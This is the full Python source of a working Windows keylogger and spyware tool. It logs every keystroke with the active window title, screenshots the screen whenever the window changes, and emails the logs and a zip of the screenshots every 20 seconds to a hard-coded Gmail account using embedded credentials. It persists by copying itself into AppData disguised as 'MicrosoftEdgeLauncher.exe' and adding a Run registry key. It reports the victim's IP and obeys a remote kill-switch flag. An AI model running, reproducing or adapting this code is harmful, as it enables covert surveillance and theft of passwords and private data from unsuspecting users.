import keyboard
import ctypes
import win32gui
import datetime
import os
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from urllib.request import urlopen
from email import encoders
import re
import shutil
import requests
import getpass
from sys import executable
import platform
import subprocess
from PIL import ImageGrab
import io
import zipfile

REPORT_INTERVAL = 20
POLLING_INTERVAL = 30
EMAIL = "ilove6841verymuch@gmail.com"
EMAIL_PASSWORD = "vyeg mhds cgge shmo"
USER_NAME = getpass.getuser()

# working_folder = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams"
# screenshots_folder = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\stuff"
# log_file = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\log.txt"
# zip_file = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\screenshots"

curr_window = ""

stop_event = threading.Event()
poller = None
timer = None

memory_log = io.StringIO()
screenshots = []

lock = threading.Lock()

def key_callback(event : keyboard.KeyboardEvent):
    global curr_window

    log_line = ""
    screenshot_line = ""
    
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    new_window = win32gui.GetWindowText(user32.GetForegroundWindow())

    lock.acquire()
    if new_window != curr_window:
        curr_window = new_window

        image = ImageGrab.grab()
        img_buffer = io.BytesIO()
        total_screenshots = len(screenshots)
        image.save(img_buffer, format="PNG")
        screenshot_line = f" | Screenshot taken: image_{total_screenshots}.png"
        img_buffer.seek(0)
        screenshots.append(img_buffer)

    log_line += f"Key: {event.name} | "
    log_line += f"{curr_window} | "

    dt = datetime.datetime.fromtimestamp(event.time)
    log_line += f"{dt}"
    log_line += screenshot_line

    memory_log.write(log_line + "\n")
    lock.release()

    print(log_line)


# def attach_file(msg, filepath):
#     with open(filepath, "rb") as f:
#         part = MIMEBase("application", "octet-stream")
#         part.set_payload(f.read())
#     encoders.encode_base64(part)
#     filename = os.path.basename(filepath)
#     part.add_header("Content-Disposition", f"attachment; filename={filename}")
#     msg.attach(part)

def send_report():
    global screenshots
    if stop_event.is_set():
        return
    
    print("Trying to send report")
    # try:
    if len(memory_log.getvalue()) > 0:
        print("Sending report")
        data = str(urlopen('http://checkip.dyndns.com/').read())
        ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
        msg = MIMEMultipart()
        msg['Subject'] = f"Report From {ip}"
        msg['From'] = EMAIL
        msg['To'] = EMAIL

        lock.acquire()

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w") as z:
            for i, stream in enumerate(screenshots):
                file_name = f"image_{i}.png"
                z.writestr(file_name, stream.getvalue())

        memory_log.seek(0)
        log_file = MIMEApplication(memory_log.read(), Name="log.txt")
        log_file["Content-Disposition"] = 'attachment; filename="log.txt"'
        msg.attach(log_file)

        if len(screenshots) > 0:
            zip_file = MIMEApplication(zip_buffer.getvalue(), Name="screenshots.zip")
            zip_file["Content-Disposition"] = 'attachment; filename="screenshots.zip"'
            msg.attach(zip_file)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(EMAIL, EMAIL_PASSWORD)
            smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())

        # clear files
        memory_log.seek(0)
        memory_log.truncate(0)
        screenshots = []

        lock.release()

    # except Exception as e:
    #     print("Failed to send report")

    timer = threading.Timer(REPORT_INTERVAL, send_report)
    timer.daemon = True
    timer.start()

def check_flag():
    if stop_event.is_set():
        return
    
    print("Checking flag")
    flag = "True"
    try:
        response = requests.get("https://api.jsonbin.io/v3/b/6a4b5550da38895dfe339f25/latest")
        flag = response.json()["record"]["flag"]
    except Exception as e:
        print("Failed to get flag")

    if flag != "True":
        stop_event.set()

    poller = threading.Timer(POLLING_INTERVAL, check_flag)
    poller.daemon = True
    poller.start()

def setup():
    print("setting up")

    # setup persistence 

    os_type = platform.system()
    if os_type == "Windows":
        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
        if not os.path.exists(location):
            shutil.copyfile(executable, location)
            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)

    try: 
        data = str(urlopen('http://checkip.dyndns.com/').read())
        ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
        msg = MIMEMultipart()
        msg['Subject'] = f"Installed/Started on {ip}"
        msg['From'] = EMAIL
        msg['To'] = EMAIL

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(EMAIL, EMAIL_PASSWORD)
            smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
    except Exception as e:
        pass

def cleanup():

    print("Cleaning up")

    if timer is not None:
        timer.cancel()

    if poller is not None:
        poller.cancel()

    keyboard.unhook_all()
    keyboard.unhook_all_hotkeys()

    os_type = platform.system()
    if os_type == "Windows":
        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe"
        if os.path.exists(location):
            os.remove(location)
            subprocess.call(rf'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /f', shell=True)

    try: 
        data = str(urlopen('http://checkip.dyndns.com/').read())
        ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
        msg = MIMEMultipart()
        msg['Subject'] = f"Sucessfully killed on {ip}"
        msg['From'] = EMAIL
        msg['To'] = EMAIL

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(EMAIL, EMAIL_PASSWORD)
            smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
    except Exception as e:
        pass


def main():
    setup()
    keyboard.on_release(key_callback)
    timer = threading.Timer(REPORT_INTERVAL, send_report)
    timer.daemon = True
    timer.start()
    poller = threading.Timer(POLLING_INTERVAL, check_flag)
    poller.daemon = True
    poller.start()
    stop_event.wait()
    cleanup()

if __name__ == "__main__":
    main()